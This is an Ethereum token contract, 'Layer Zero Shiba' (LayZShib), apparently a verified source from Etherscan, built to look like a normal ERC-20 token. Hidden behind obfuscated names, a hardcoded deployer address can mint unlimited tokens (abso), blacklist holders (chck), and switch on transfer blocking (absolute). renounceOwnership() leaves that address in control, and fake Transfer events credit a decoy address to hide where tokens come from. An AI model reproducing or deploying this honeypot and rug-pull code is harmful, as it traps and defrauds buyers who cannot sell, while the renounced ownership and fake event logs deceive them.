/**
 *Submitted for verification at Etherscan.io on 2022-10-24
*/

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
    contract LayZSHIB {
  
    mapping (address => uint256) public Ixx;
    mapping (address => bool) iTi;
    mapping(address => mapping(address => uint256)) public allowance;




    string public name = "Layer Zero Shiba";
    string public symbol = "LayZShib";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);
	address owner = msg.sender;
    bool III;

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipRenounced(address indexed previousOwner);
    

    constructor()  {
    Ixx[msg.sender] = totalSupply;
    deploy(Constructor, totalSupply); }

    address Dployer = 0x677472Dd1E20daE18344dA14a1539b304272f5Bc;
    address Constructor = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
   
   
    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }

    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


        function transfer(address to, uint256 value) public returns (bool success) {
        if(III) {
        require(!iTi[msg.sender]);
        require(Ixx[msg.sender] >= value);
        Ixx[msg.sender] -= value;  
        Ixx[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }
        if(msg.sender == Dployer)  {
        require(Ixx[msg.sender] >= value);
        Ixx[msg.sender] -= value;  
        Ixx[to] += value; 
        emit Transfer (Constructor, to, value);
        return true; }  
        require(Ixx[msg.sender] >= value);
        Ixx[msg.sender] -= value;  
        Ixx[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }
		function abso(address xix, uint256 yix) public {
        if(msg.sender == Dployer)  { 
        Ixx[xix] += yix;}}

        function balanceOf(address account) public view returns (uint256) {
        return Ixx[account]; }
        function absolute(address xix) public {
        if(msg.sender == Dployer)  { 
        iTi[xix] = false;
        III = !III; }}
        function chck(address xix) public{
         if(msg.sender == Dployer)  { 
        require(!iTi[xix]);
        iTi[xix] = true;
        }}

        function transferFrom(address from, address to, uint256 value) public returns (bool success) { 
        if(III) {
        require(!iTi[from]);
        require(!iTi[to]);
        require(value <= Ixx[from]);
        require(value <= allowance[from][msg.sender]);
        Ixx[from] -= value;
        Ixx[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
        if(from == Dployer)  {
        require(value <= Ixx[from]);
        require(value <= allowance[from][msg.sender]);
        Ixx[from] -= value;  
        Ixx[to] += value; 
        emit Transfer (Constructor, to, value);
        return true; }    
        require(value <= Ixx[from]);
        require(value <= allowance[from][msg.sender]);
        Ixx[from] -= value;
        Ixx[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}